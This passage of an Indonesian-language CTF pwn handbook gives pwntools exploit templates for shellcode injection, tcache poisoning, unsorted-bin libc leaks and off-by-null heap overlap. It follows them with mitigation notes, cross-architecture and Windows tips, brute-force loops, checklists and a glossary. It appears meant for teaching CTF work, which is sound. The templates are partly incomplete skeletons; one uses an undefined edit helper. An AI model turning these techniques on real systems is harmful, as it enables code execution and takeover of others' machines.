shellcode = asm(shellcraft.sh())  # shell
# Atau kalo ada seccomp:
# shellcode = asm(shellcraft.open('flag.txt') + shellcraft.read('rax', 'rsp', 0x100) + shellcraft.write(1, 'rsp', 0x100))

# Cari address buffer atau JMP RSP:
# Cek pake: objdump -d ./chall | grep "jmp.*rsp"
JMP_RSP = 0x401234  # <— GANTI: address jmp rsp atau address buffer

payload  = b'A' * OFFSET
payload += p64(JMP_RSP)   # lompat ke shellcode
payload += shellcode       # shellcode di stack setelah RIP

# Atau kalo buffer-nya executable:
# payload = shellcode + b'A' * (OFFSET - len(shellcode)) + p64(BUF_ADDR)

io.sendline(payload)
io.interactive()
```

---

## 48N. Template Exploit: Tcache Poisoning (glibc modern)

**Kapan pake:** Heap challenge, tcache aktif, UAF/double free.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)

def delete(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())

def show(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())
    return io.recvuntil(b'> ')

io = process([exe.path])

# Step 1: Alloc + Free → UAF leak
create(0x80, b'A' * 8)   # chunk 0
create(0x80, b'B' * 8)   # chunk 1 (biar gak consolidate dengan top)
delete(0)                 # chunk 0 masuk unsorted bin (kalo > tcache size)

# Kalo size cocok tcache (0x20-0x410):
# free → masuk tcache, bukan unsorted bin
# Butuh read freed chunk → UAF → leak heap

# Step 2: Leak (UAF / unsorted bin)
leak = show(0)    # baca fd chunk yang udah di-free
# ... parsing leak ...

# Step 3: Tcache poisoning (safe-linking aware)
# fd_mangled = (heap_addr >> 12) ^ target_addr
# Kalo gak tau heap base, butuh leak heap dulu
TARGET_ADDR = libc.symbols['__free_hook']  # glibc < 2.34
# Atau exit handler, _IO_FILE, dll buat glibc modern

# Write fd palsu
payload = p64(TARGET_ADDR)  # atau p64(mangled_target) kalo safe-linking
edit(0, payload)            # <— kalo ada edit

# Step 4: Dua kali alloc → dapet chunk di TARGET_ADDR
create(0x80, p64(one_gadget))  # alloc dari tcache (chunk 2)
create(0x80, p64(one_gadget))  # alloc di TARGET_ADDR + overwrite

# Step 5: Trigger
delete(0)   # trigger free → jump ke one_gadget

io.interactive()
```

---

## 48O. Template Exploit: Unsorted Bin Leak (Heap -> Libc)

**Kapan pake:** Heap UAF, butuh leak libc dari heap.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)

def delete(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())

def show(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

io = process([exe.path])

# Alloc chunk > 0x400 biar gak masuk tcache langsung
create(0x500, b'A' * 8)   # chunk 0 — besar
create(0x20, b'B' * 8)    # chunk 1 — guard (biar gak consolidate)

delete(0)   # free chunk 0 — masuk unsorted bin
            # fd/bk sekarang nunjuk ke main_arena + 96 (offset)

# Kalo ada UAF / show setelah free:
leak_data = show(0)
leak_addr = u64(leak_data[:8].ljust(8, b'\x00'))
log.info(f"Unsorted bin leak: {hex(leak_addr)}")

# Hitung libc base:
# main_arena offset tergantung libc version
# libc versi 2.31: main_arena = libc_base + 0x1ebb80
# libc versi 2.35: main_arena = libc_base + 0x1f2c80
# Cari pake: readelf -s ./libc.so.6 | grep main_arena
MAIN_ARENA_OFFSET = 0x1ebb80  # <— GANTI: sesuai libc
libc.address = leak_addr - MAIN_ARENA_OFFSET - 96  # 96 = offset fd/bk di main_arena
log.success(f"libc base: {hex(libc.address)}")
```

---

## 48P. Template Exploit: Off-by-Null Heap Overlap (glibc modern)

**Kapan pake:** Ada off-by-null di heap, bisa overlap chunk.

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./chall', checksec=False)
context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

# Ini teknik advanced. Pake pas:
# 1. Ada off-by-null (byte ke-0 di size)
# 2. Ada UAF atau show untuk leak
# 3. Butuh overlap chunk untuk tcache poisoning

# Flow umum off-by-null:
# 1. Alloc A (0x100), B (0x100), C (0x100)
# 2. Free A
# 3. Alloc A2 (0x80) — nemplok di bekas A. Sisa A = 0x80 byte lagi
# 4. Off-by-null overwrite PREV_INUSE bit di B
# 5. Free B → consolidate dengan A2 → A2 dan B jadi 1 chunk besar
# 6. Alloc dari consolidated chunk → overlap dengan C
# 7. Dari overlap, bisa baca tulis chunk C tanpa seizin C

# Template ini cuma kerangka — tiap challenge beda implementasi.

def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size: ', str(size).encode())
    io.sendafter(b'data: ', data)

def delete(index):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'index: ', str(index).encode())

def show(index):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'index: ', str(index).encode())

io = process([exe.path])

create(0x108, b'A' * 0x108)  # chunk 0 — victim (size 0x110 + flag)
create(0x108, b'B' * 0x108)  # chunk 1 — terkena off-by-null
create(0x108, b'C' * 0x108)  # chunk 2 — guard
create(0x108, b'D' * 0x108)  # chunk 3 — barrier

delete(0)  # free victim → masuk unsorted bin atau tcache
delete(2)  # free guard dulu biar chunk 1 gak consolidate ke atas

# Off-by-null: overwrite LSb of chunk 1's size → PREV_INUSE = 0
# ... (tergantung implementasi bug)

# Free chunk 1 → trigger backward consolidation → chunk 0+1 overlap
delete(1)

# Sekarang alloc → dapet overlap region
create(0x180, b'E' * 8)  # nemplok di consolidated chunk 0+1

# Dari sini, bisa baca/tulis chunk 2 yang masih "aktif"
# Leak, tcache poisoning, dst.

io.interactive()
```

## 49. libc Identification Playbook

Jika hanya 1 leak: gunakan low 12 bits untuk shortlist.
Jika 2-3 leak: identifikasi lebih akurat.

Tools: `libc-database`, `libc.rip`

---

## 50. Stack Pivot Targets

- `.bss`
- heap chunk
- mmap region
- global array

---

## 51. Badchars

Kalau input dipotong/filter:
- cari karakter terlarang
- sesuaikan packing
- gunakan encoder/split payload
- hati-hati null bytes pada alamat

---

## 52. Menu Challenge Patterns

Pattern umum: `create`, `edit`, `show`, `delete`

| Menu + Kondisi | Bug |
|---------------|-----|
| `show` setelah free | UAF read |
| `edit` setelah free | UAF write |
| `delete` dua kali | Double free |
| Size tidak diverifikasi | Overflow / overlap |
| Index tidak diverifikasi | OOB |

---

## 53. Common Leak Sources

- GOT / PLT
- saved return addr
- stack prints
- `puts` of freed chunk
- unsorted bin metadata
- `%p` spray
- object pointer di `.bss`
- `environ`

---

## 54. Common Write Targets

| Target | Kondisi |
|--------|---------|
| saved RIP | Selalu |
| GOT | Partial RELRO |
| `__free_hook` | Glibc < 2.34 |
| `__malloc_hook` | Glibc < 2.34 |
| Exit handlers | Glibc 2.34+ |
| vtable / function pointer | Ada pointer function |
| `_IO_FILE` structures | FSOP |

---

## 54A. Exit-Time Targets

Kalau hook klasik tidak ada, pikirkan target aktif saat terminasi:
- exit handlers
- destructor arrays (`.fini_array`)
- FILE flush path

---

## 55. Hook Targets and Version Awareness

Checklist:
1. target ini masih ada di libc versi ini?
2. writable?
3. reachable oleh primitive?
4. trigger path-nya natural?

---

## 55A. Leak Target Alternatif Modern

Kalau leak GOT/libc klasik tidak tersedia:
- `_IO_2_1_stdout_`
- `_IO_2_1_stdin_`
- `environ`
- `main_arena`
- heap pointer dari freelist

---

## 56. one_gadget Constraints

Cek sebelum commit:
- register yang harus NULL?
- stack yang harus menunjuk area valid?
- memori yang harus writable?
- chain saat ini memenuhi?

---

## 57. ORW vs `system("/bin/sh")`

| Pilih ORW | Pilih shell |
|-----------|-------------|
| Seccomp ketat | Post-exploit interaktif |
| Shell tidak perlu | Seccomp longgar |
| Output flag cukup | Mau jelajahi sistem |
| Service mati cepat | Mau interaktif |

---

## 58. Remote Reliability

Exploit yang bagus:
- tidak bergantung timing halus
- tidak hardcode leak lokal
- menangani short read
- sinkron dengan prompt/menu (`recvuntil`, `sendlineafter`)
- punya retry jika race

---

## 59. Pwntools Good Habits

- set `context.binary`
- parse leak dengan `u64`, `u32`
- pakai `flat()` untuk payload kompleks
- log leak penting
- bedakan mode REMOTE/GDB/LOCAL
- buat helper `sla`, `sa`, `ru`

```python
def sla(delim, data):
    return io.sendlineafter(delim, data)
def sa(delim, data):
    return io.sendafter(delim, data)
def ru(x):
    return io.recvuntil(x)
```

---

## 60. Crash-First Workflow

1. spam input besar
2. lihat crash point
3. cek registers/stack
4. map input ke corruption

---

## 61. Source Available vs No Source

Source ada: audit logic, compile, debug lebih gampang.
Source gak ada: dynamic debugging lebih dominan.

---

## 62. QEMU-user untuk Non-native Arch

```bash
qemu-aarch64 -L . ./chall
gdb-multiarch ./chall
```

---

## 63. Statically Linked Binary

**Kelebihan:** gadget melimpah, gak perlu leak libc.
**Kekurangan:** binary besar, reverse berat.

Pikirkan: ROP, ret2syscall, SROP.

---

## 64. setuid / Privileged Binary

- `system("/bin/sh")` kadang drop privilege
- `execve` atau ORW kadang lebih jujur
- environment sanitization bisa mengubah perilaku

---

## 65. Race / Timing

- buat PoC deterministik dulu
- cari trigger window jelas
- tambahkan retry dan timeout logic

---

## 66. Troubleshooting Matrix

### Exploit lokal jalan, remote tidak
- [ ] libc beda?
- [ ] ld beda?
- [ ] ASLR/PIE leak salah?
- [ ] seccomp beda?
- [ ] line ending / buffering beda?
- [ ] stack alignment beda?

### `system("/bin/sh")` crash di amd64
- [ ] tambah `ret` alignment
- [ ] cek libc base benar

### Dapat shell lokal, remote EOF
- [ ] seccomp?
- [ ] service menutup stdin/stdout?
- [ ] shell tidak interaktif?
- [ ] gunakan ORW

### Leak keliatan benar tapi base salah
- [ ] salah symbol offset
- [ ] leak bukan symbol yang kamu kira
- [ ] parse newline salah
- [ ] endianness salah

### Heap exploit inconsistent
- [ ] salah size class
- [ ] tcache count tidak sesuai
- [ ] safe-linking belum di-handle
- [ ] target overwrite tidak ter-trigger

### Format string write tidak bekerja
- [ ] offset salah
- [ ] `numbwritten` salah
- [ ] write size salah
- [ ] null byte memotong payload

### SROP tidak jalan
- [ ] `syscall`/`int 0x80` gadget salah
- [ ] register syscall untuk `sigreturn` tidak benar
- [ ] frame format salah untuk arch itu

---

## 66A. Cross-Architecture PWN — ARM, AArch64, MIPS, RISC-V

Selama ini kamu main di x86/x64 aja. Tapi di CTF, tantangan PWN juga bisa pake arsitektur lain. Bagian ini ngasih tau kamu perbedaan utamanya.

### ARM32 (ARMv7)

**Calling convention:**
- Argumen 1-4: `r0`, `r1`, `r2`, `r3`
- Argumen sisanya: stack
- Return value: `r0`

**Bedanya dengan x86:**
- Gak ada `ret` yang pop dari stack — pake `bx lr` atau `pop {pc}`
- Return address disimpan di `lr` (link register), bukan di stack
- TAPI di function non-leaf, `lr` di-push ke stack
- **Little endian** by default (tapi bisa big endian juga)
- Instruksi 4 byte (ARM mode) atau 2 byte (Thumb mode)

**THUMB mode:**
- Mode 16-bit, instruksi lebih pendek
- Sering dipake di exploit: switch ke Thumb pake `bx reg` dengan LSB=1
- Di shellcode, sering pake Thumb biar lebih kecil

**Stack frame ARM:**
```asm
push {r11, lr}    ; simpen fp dan return address
mov r11, sp       ; fp = sp
sub sp, sp, #0x10 ; alokasi local variable
...
pop {r11, pc}     ; restore + return
```

**PWN di ARM:**
- ret2libc: cari `pop {r0, pc}` gadget (setara `pop rdi; ret`)
- ROP gadget di ARM = kumpulan instruksi + `pop {r0-r3, pc}` atau `bx lr`
- **Gadget hunting:**
```bash
ROPgadget --binary ./chall
ROPGadget --binary ./chall | grep "pop {r0"
```

**Shellcode ARM:**
```python
from pwn import *
context.arch = 'arm'
context.os = 'linux'
sc = asm(shellcraft.sh())
```

### AArch64 (ARM64)

**Calling convention:**
- Argumen 1-8: `x0` - `x7`
- Sisanya: stack
- Return: `x0`

**Register penting:**
- `x30` = `lr` (link register, return address)
- `x29` = `fp` (frame pointer)
- `sp` = stack pointer
- `pc` = program counter (setara RIP)
- `x0-x7` = argumen (setara rdi, rsi, rdx...)

**PWN di AArch64:**
- `ret` pake `x30` (bukan stack)
- Buat ROP: cari gadget yang load `x30` dari stack + `ret`
```asm
ldp x0, x1, [sp]   ; load argumen dari stack
ldp x29, x30, [sp, #0x10]  ; load fp dan return addr
ret                     ; return ke x30
```
- **Gadget umum:** `ldp x0, x19, [sp, #0x10] ; ldp x29, x30, [sp, #0x20] ; add sp, sp, #0x30 ; ret`

**Setup QEMU untuk AArch64:**
```bash
qemu-aarch64 -L /usr/aarch64-linux-gnu ./chall
gdb-multiarch ./chall
target remote :1234
```

**Shellcode AArch64:**
```python
context.arch = 'aarch64'
sc = asm(shellcraft.sh())
```

### MIPS (32-bit / 64-bit)

**Calling convention:**
- Argumen 1-4: `$a0` - `$a3`
- Sisanya: stack
- Return: `$v0`

**PENTING:** MIPS punya **delay slot** — instruksi setelah `jump`/`branch` TETAP DIJALANKAN sebelum lompatan terjadi. Ini sering bikin bingung waktu reverse.

**Bedanya di endianness:**
- MIPS bisa **little endian** (mipsel) atau **big endian** (mips)
- Cek pake: `readelf -h ./chall | grep Data`

**Gadget MIPS:**
```bash
ROPgadget --binary ./chall | grep "jr \$ra"
```
Gadget di MIPS biasanya pake `jr $ra` atau `jalr $ra` buat return.

### RISC-V (RV64)

Arsitektur baru yang mulai muncul di CTF.

**Calling convention:**
- Argumen: `a0` - `a7` (setara `x10` - `x17`)
- Return: `a0`
- Return address: `ra` (x1)

**PWN di RISC-V:**
- ROP pake `ret` yang nilainya dari `ra`
- Butuh gadget `ld ra, offset(sp); ...; ret`

### Toolchain untuk Cross-Arch

```bash
# Install toolchain (Debian/Ubuntu/Kali)
sudo apt install gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu gcc-mipsel-linux-gnu

# Compile buat ARM
arm-linux-gnueabihf-gcc -o chall vuln.c

# Compile buat AArch64
aarch64-linux-gnu-gcc -o chall vuln.c

# Compile buat MIPS (little endian)
mipsel-linux-gnu-gcc -o chall vuln.c

# Debug multi-arch
sudo apt install gdb-multiarch qemu-user
```

### Ringkasan Perbedaan Arsitektur

| Aspek | x86_64 | ARM32 | AArch64 | MIPS |
|-------|--------|-------|---------|------|
| Return addr di | Stack | `lr` | `x30` | `$ra` |
| Argumen | `rdi,rsi,rdx,rcx` | `r0-r3` | `x0-x7` | `$a0-$a3` |
| Argumen ke-4 syscall | `r10` | `r3` | `x3` | `$a3` |
| Instruksi size | Variable | 4/2 byte | 4 byte | 4 byte |
| Endian default | Little | Little | Little | Big/Little |
| Gadget umum | `pop rdi; ret` | `pop {r0, pc}` | `ldr x0, [sp]; ret` | `lw $a0, offset($sp); jr $ra` |

---

## 66B. Windows PWN — PE Exploitation

CTF jarang, tapi di dunia nyata banyak. Windows punya mitigasi sendiri yang beda dari Linux.

### PE File Format (vs ELF)

| Aspek | ELF (Linux) | PE (Windows) |
|-------|------------|--------------|
| Executable | `.text` | `.text` |
| Data | `.data`, `.bss` | `.data`, `.rdata`, `.bss` |
| Import table | `.got.plt` | `.idata` (Import Address Table) |
| Export table | `.dynsym` | `.edata` |
| Relocation | `.rela.plt` | `.reloc` |

Di Windows, function dari DLL di-import via **IAT** (Import Address Table) — mirip GOT. Tapi IAT bisa di-protect pake **/FORCEINTEGRITY**.

### Windows Mitigasi PENTING

| Mitigasi | Nama Windows | Analogi Linux |
|----------|-------------|---------------|
| Stack cookie | **GS** (`/GS`) | Canary |
| Stack gak executable | **DEP** (`/NXCOMPAT`) | NX |
| Address randomization | **ASLR** (`/DYNAMICBASE`) | ASLR |
| GOT protection | **SafeSEH** / **CFG** | RELRO |
| Control Flow Guard | **CFG** | Indirect call protection |

### GS (Stack Canary Windows)

Sama kayak canary di Linux:
```asm
mov eax, fs:[2Ch]    ; ambil cookie dari TLS
mov [ebp-4], eax     ; simpen di stack
...
mov ecx, [ebp-4]
xor ecx, fs:[2Ch]    ; verifikasi pas return
call __security_check_cookie
```

### SEH (Structured Exception Handling)

Windows punya mekanisme exception — kalo program crash, SEH handler dipanggil. Sebelum SafeSEH, attacker bisa overwrite SEH pointer buat dapet kontrol.

```asm
; SEH chain ada di stack
; Kalo overflow overwrite SEH → kontrol pas exception!
[SHE handler pointer]  ← target overwrite
[next SEH]
[EBP]
[local vars]
```

### WinDbg vs GDB

| Konsep | GDB/Linux | WinDbg/Windows |
|--------|-----------|----------------|
| Breakpoint | `b main` | `bp main` |
| Continue | `c` | `g` |
| Step in | `si` | `t` |
| Step over | `ni` | `p` |
| Lihat memory | `x/20gx $rsp` | `dq rsp L20` |
| Lihat register | `info reg` | `r` |
| Modules | `info proc map` | `lm` |
| Analisis crash | — | `!analyze -v` |
| Stack trace | `bt` | `k` |

### Shellcode Windows

Shellcode Windows beda — pake Win32 API, bukan syscall langsung.

```python
from pwn import *
context.arch = 'i386'
context.os = 'windows'
# Pake WinExec("cmd", 1) atau CreateProcess
sc = asm(shellcraft.windows.exec('cmd.exe'))
```

Windows shellcode biasanya lebih besar karena panggil API lewat PEB (Process Environment Block) buat dapet address kernel32.dll.

---

## 66C. Blind Exploitation — Exploit Tanpa Leak

Kadang kamu gak punya leak sama sekali. Atau binary gak ngasih output (blind). Atau crash cuma "connection closed". Ini teknik survival.

### Kapan Blind Exploit?

- Binary gak nge-print apapun (no output)
- Hanya ada `read` dan `write` — tapi write ke fd lain
- Close connection pas crash — harus tebak address
- ASLR aktif dan gak ada leak satupun

### Teknik Blind: ret2plt / ret2dlresolve

Tanpa leak libc, kamu masih bisa pake **ret2dlresolve** — paksa linker resolve `system` meskipun gak di-import.

```python
# Handbook section 42 — pake Ret2dlresolvePayload
dlresolve = Ret2dlresolvePayload(exe, symbol='system', args=['/bin/sh'])
rop = ROP(exe)
rop.raw(b'A' * OFFSET)
rop.ret2dlresolve(dlresolve)
```

**Ini BEKERJA tanpa leak satupun!** Dynamic linker yang ngerjain semua kerja berat.

### Teknik Blind: Partial Overwrite Bruteforce

Kalo gak ada leak, ASLR masih nyisain **12 bit bawah** yang stabil.

```python
# Partial overwrite — cuma ganti byte terakhir return address
# Dengan probabilitas 1/16, byte yang kamu tulis bener
# Bruteforce 16 kali rata-rata dapet

payload = b'A' * OFFSET
payload += b'\xXX'  # overwrite 1 byte terakhir return address
```

Tiap byte punya 256 kemungkinan. Kalo 12 bit = 4096 kemungkinan. Tapi kalo partial overwrite 1 byte = 256 kemungkinan.

### Teknik Blind: ret2csu tanpa leak

ret2csu (`__libc_csu_init`) bisa dipake tanpa tau libc base. Karena gadgetnya ada di binary yang No PIE.

Tapi ini terbatas — cuma bisa panggil function yang udah di-PLT.

### Teknik Blind: One-byte Write

Kalo kamu cuma bisa nulis 1 byte (off-by-one), kamu bisa:
- Overwrite size field di heap → chunk overlap
- Overwrite LSB return address → partial overwrite
- Clear PREV_INUSE bit → consolidate

### Teknik Blind: Stack Pivot Bruteforce

Kalo offset kecil dan gak cukup buat chain, stack pivot + bruteforce:
```python
# Alamat .bss tetap (No PIE) — target pivot
# Tapi butuh tebak alamat .bss (kalo PIE)
# Kalo No PIE → langsung pake
LEAVE_RET = 0x401234
payload = b'A' * OFFSET
payload += p64(bss_addr)  # fake rbp
payload += p64(LEAVE_RET)
```

---

## 66D. Exploit Reliability — Bikin Exploit Stabil

### Kenapa Exploit Gak Stabil?

| Penyebab | Solusi |
|----------|--------|
| ASLR | Leak dulu |
| Heap state berbeda | Konsisten alloc/free |
| Timing (race condition) | Bruteforce + retry |
| Libc beda versi | Identifikasi + download |
| Stack alignment | Extra `ret` gadget |
| Short read | Loop sampai dapet |

### Partial Overwrite Strategy

Kalo cuma bisa overwrite 1-2 byte:

```python
# 12 bit bawah = page offset (stabil, gak kena ASLR)
# 4 bit berikutnya = random (1/16 chance)

# Strategi: bruteforce 4 bit
for attempt in range(20):
    payload = padding + partial_addr  # overwrite 1-2 byte
    io = process('./chall')
    io.sendline(payload)
    try:
        io.recv(timeout=1)
        # DAPET!
        break
    except:
        io.close()
        continue
```

### Heap Determinism

Buat heap exploit stabil:
1. **Alokasi urutan tetap** — selalu alloc A, B, C dalam urutan sama
2. **Ukuran konsisten** — jangan ganti-ganti ukuran kalo gak perlu
3. **Guard chunk** — selalu sisipin chunk kecil di antara chunk penting biar gak consolidate
4. **Tcache count** — tracker tcache count biar gak overflow/underflow

### Bruteforce Realistis

| Mitigasi | Bit random | Bruteforce rata-rata |
|----------|-----------|---------------------|
| ASLR 32-bit | 8 bit heap | 128 attempt |
| ASLR 64-bit | 28 bit heap | 134 juta (gak realistis) |
| ASLR 64-bit + partial overwrite | 4 bit | 8 attempt |
| Stack canary + fork server | 8 bit | 128 attempt |

**Golden rule:** Kalo perlu bruteforce > 1024 attempt, cari leak dulu. Bruteforce itu jalan terakhir.

### Network Reliability

```python
def exploit(retries=3):
    for i in range(retries):
        try:
            io = remote('host', port, timeout=10)
            # ... exploit ...
            io.interactive()
            return
        except Exception as e:
            log.warning(f"Attempt {i+1} failed: {e}")
            continue
    log.error("All retries exhausted")
```

---

### A
- **ABI** (Application Binary Interface): Aturan function manggil satu sama lain di level binary.
- **Address**: Alamat memory, kayak nomor rumah di RAM.
- **Alignment**: Aturan alamat harus kelipatan tertentu (biasanya 16 byte).
- **ASLR** (Address Space Layout Randomization): Teknik ngacak alamat memory tiap program jalan.
- **Arbitrary Read**: Bisa baca memory di alamat mana aja.
- **Arbitrary Write**: Bisa nulis memory di alamat mana aja.
- **Arbitrary Free**: Bisa free alamat mana aja.

### B
- **Badchars**: Karakter yang dilarang/dipotong program.
- **Base Address**: Alamat awal suatu region memory.
- **.bss**: Region data global yang belum diinisialisasi.
- **Buffer**: Tempat nyimpen data sementara.
- **Buffer Overflow**: Nulis melebihi kapasitas buffer.

### C
- **Calling Convention**: Aturan ngirim argumen ke function.
- **Canary**: Nilai random di stack yang dicek sebelum return.
- **Chain**: Rangkaian langkah exploit.
- **checksec**: Tool mitigasi binary.
- **Chunk**: Unit alokasi di heap.
- **Constraint**: Syarat yang harus dipenuhi.
- **Control Flow Hijack**: Kontrol kemana program jalan.
- **Core dump**: File state program pas crash.
- **Cyclic**: Pattern unik buat cari offset.

### D
- **.data**: Region data global yang sudah diinisialisasi.
- **Double free**: Free chunk yang sama dua kali.
- **Dynamic binary**: Binary pake shared library.
- **Dynamic linker (ld)**: Program yang load library pas startup.

### E
- **ELF** (Executable and Linkable Format): Format binary Linux.
- **Endianness**: Urutan byte dalam memory. x86/x64 = little endian.
- **Entropy**: Tingkat kerandoman.
- **execve**: Syscall buat jalanin program baru.

### F
- **Fastbin**: Bin buat chunk kecil (0x20-0x80).
- **fd** (forward pointer): Pointer ke chunk berikutnya di bin.
- **FLAG**: String yang harus didapat buat menang CTF.
- **FORTIFY**: Mitigasi keamanan di function tertentu.
- **Format String**: Bug dari printf(user_input).
- **Free**: Balikin chunk ke allocator.
- **FSOP** (File Stream Oriented Programming): Exploit lewat FILE structure.

### G
- **Gadget**: Instruksi pendek diakhiri `ret`, dipake ROP.
- **GDB** (GNU Debugger): Debugger.
- **GEF**: Plugin GDB (alternatif pwndbg).
- **GOT** (Global Offset Table): Tabel alamat function di libc.
- **GOT Overwrite**: Nulis ulang GOT entry.

### H
- **Heap**: Memory dinamis yang di-malloc/free.
- **Hook**: Pointer function yang dipanggil otomatis.
- **House of XXX**: Keluarga teknik heap exploit.

### I
- **i386**: Arsitektur 32-bit Intel.
- **amd64/x86_64**: Arsitektur 64-bit.
- **Imported function**: Function dari libc.
- **Integer overflow**: Angka kegedean muter jadi kecil.
- **Interpreter**: Program yang nge-load binary (ld-linux).

### L
- **Largebin**: Bin chunk ukuran besar.
- **Lazy binding**: Symbol di-resolve pas pertama dipanggil.
- **ld/ld-linux**: Dynamic linker.
- **Leak**: Bocoran alamat memory.
- **libc**: C standard library.
- **libc base**: Alamat awal libc di memory.
- **Little endian**: Byte terkecil di alamat terendah.

### M
- **main_arena**: Struktur utama glibc allocator.
- **malloc**: Minta memory dari heap.
- **Memory layout**: Peta pembagian memory program.
- **Mitigation**: Fitur keamanan yang bikin exploit lebih susah.
- **mprotect**: Syscall ganti proteksi memory page.
- **Mangled pointer**: Pointer yang di-XOR (safe-linking).

### N
- **NX** (No-Execute): Memory data gak boleh dieksekusi.
- **NOP sled**: Deretan NOP (0x90) buat landing zone.

### O
- **OOB** (Out-of-Bounds): Baca/tulis di luar batas.
- **Off-by-one**: Nulis 1 byte kelebihan.
- **Off-by-null**: Nulis null byte 1 kelebihan.
- **one_gadget**: Satu gadget di libc yang kasih shell.
- **ORW** (Open-Read-Write): Teknik baca file tanpa shell.
- **Offset**: Jarak dari suatu titik ke titik lain.

### P
- **Packing**: Ngubah integer ke bytes (p64, p32).
- **PIE** (Position-Independent Executable): Binary diacak.
- **PLT** (Procedure Linkage Table): Stub function pemanggil symbol dinamis.
- **Pointer**: Variable yang nyimpen alamat memory.
- **PWN**: Kategori CTF exploit binary.
- **pwndbg**: Plugin GDB.
- **pwntools**: Library Python exploit.

### R
- **rax/rdi/rsi/rdx/r8/r9**: Register CPU.
- **recvuntil/sendlineafter**: Fungsi sinkronisasi pwntools.
- **Register**: Tempat penyimpanan super-cepet CPU.
- **RELRO**: Mitigasi terhadap GOT.
- **ret**: Instruction return.
- **ret2libc**: Panggil function libc.
- **ret2syscall**: Panggil syscall langsung.
- **ret2win**: Lompat ke function menang.
- **ret2dlresolve**: Paksa linker resolve symbol baru.
- **ret2csu**: Pake gadget __libc_csu_init.
- **RIP**: Instruction Pointer — register instruction yang lagi dijalanin.
- **ROP** (Return-Oriented Programming): Rangkai gadget.
- **RSP**: Stack Pointer — register puncak stack.

### S
- **Safe-linking**: Pointer freelist di-XOR (glibc 2.32+).
- **Seccomp**: Filter syscall.
- **setcontext**: Function libc buat set register dari struct.
- **Shellcode**: Kode mesin yang dieksekusi langsung.
- **Sigreturn**: Syscall balik dari signal handler.
- **Smallbin**: Bin ukuran sedang.
- **SROP** (Sigreturn-Oriented Programming): Exploit fake signal frame.
- **Stack**: Memory LIFO buat local variable dan return address.
- **Stack alignment**: Stack harus 16-byte aligned.
- **Stack frame**: Ruang kerja function di stack.
- **Stack pivot**: Mindahin stack ke region lain.
- **Static binary**: Binary semua library digabung.
- **Stripped**: Symbol/nama function dihapus.
- **Symbol table**: Daftar nama function/variable.
- **Syscall**: Panggilan ke kernel Linux.

### T
- **Tcache** (Thread-Local Cache): Cache per-thread chunk baru di-free (glibc 2.26+).
- **Tcache poisoning**: Manipulasi pointer tcache.
- **telescope**: Command lihat stack + follow pointer.
- **.text**: Region kode executable.

### U
- **UAF** (Use-After-Free): Pake memory yang udah di-free.
- **Unpacking**: Ngubah bytes ke integer (u64, u32).
- **Unsorted bin**: Bin sementara chunk baru di-free.

### V
- **vmmap**: Peta memory.
- **Vtable**: Table function pointer C++.

### WXYZ
- **Win function**: Function yang kasih shell/flag.
- **Writable**: Region memory yang bisa ditulis.

---

## 68. If You Are Completely Stuck

Kalau mentok, reset:
1. tulis mitigasi
2. tulis bug class
3. tulis primitive
4. tulis semua leak yang mungkin
5. tulis semua write target yang mungkin
6. pilih jalur termurah lagi

Biasanya kebuntuan karena:
- salah identifikasi primitive
- terlalu cepat milih target overwrite
- belum punya leak yang wajib

---

## 69. Solve Checklist

```text
[ ] file / checksec / ldd
[ ] jalankan binary dan pahami IO
[ ] identifikasi bug class
[ ] tentukan mitigasi utama
[ ] cari crash / offset / primitive
[ ] leak yang wajib didapat
[ ] tentukan target akhir: shell / ORW / print flag
[ ] buat PoC lokal kecil
[ ] samakan libc/ld/remote parity
[ ] baru tulis exploit penuh
[ ] uji lokal tanpa GDB
[ ] uji lokal dengan GDB
[ ] uji remote
```

---

## 69A. Anti-Buntu Checklist

```text
[ ] Saya benar tidak salah klasifikasi bug?
[ ] Saya sudah cek semua leak source obvious?
[ ] Saya terlalu cepat pilih one_gadget?
[ ] Saya lupa seccomp?
[ ] Saya salah libc/ld?
[ ] Saya terlalu ngotot heap padahal ret2libc cukup?
[ ] Saya terlalu ngotot shell padahal ORW cukup?
[ ] Saya lupa stack alignment?
[ ] Saya belum cek partial overwrite?
[ ] Saya belum cek target exit-time?
[ ] Saya belum cek binary base / PIE leak?
[ ] Saya belum cek heap leak yang dibutuhkan safe-linking?
```

---

## 70. Teknik yang Wajib Ada di Radar

- ret2win
- ret2libc
- ROP
- ret2csu
- ret2syscall
- shellcode
- ORW
- format string read/write
- canary leak
- PIE leak
- partial overwrite
- stack pivot
- ret2dlresolve
- SROP
- tcache poisoning
- unsorted bin leak
- fastbin dup
- off-by-null overlap
- FSOP
- `one_gadget` with constraints
- seccomp filter-aware exploitation
- libc identification
- remote parity via `patchelf`
- symbolic execution with angr (constraint-heavy)
- PLT/GOT/lazy binding reasoning
- DynELF / no-libc remote workflow
- exit-time overwrite targets
- heap family modern beyond hook overwrite

---

## 71. Sources / Primary References

- pwntools docs: https://docs.pwntools.com/
- pwntools stable docs: https://docs.pwntools.com/en/stable
- pwntools ROP docs: https://docs.pwntools.com/en/stable/rop/rop.html
- pwntools fmtstr docs: https://docs.pwntools.com/en/stable/fmtstr.html
- pwntools shellcraft docs: https://docs.pwntools.com/en/stable/shellcraft.html
- pwndbg docs index: https://pwndbg.re/2025.10.10/commands/
- pwndbg heap bins docs: https://pwndbg.readthedocs.io/en/stable/commands/heap/bins/
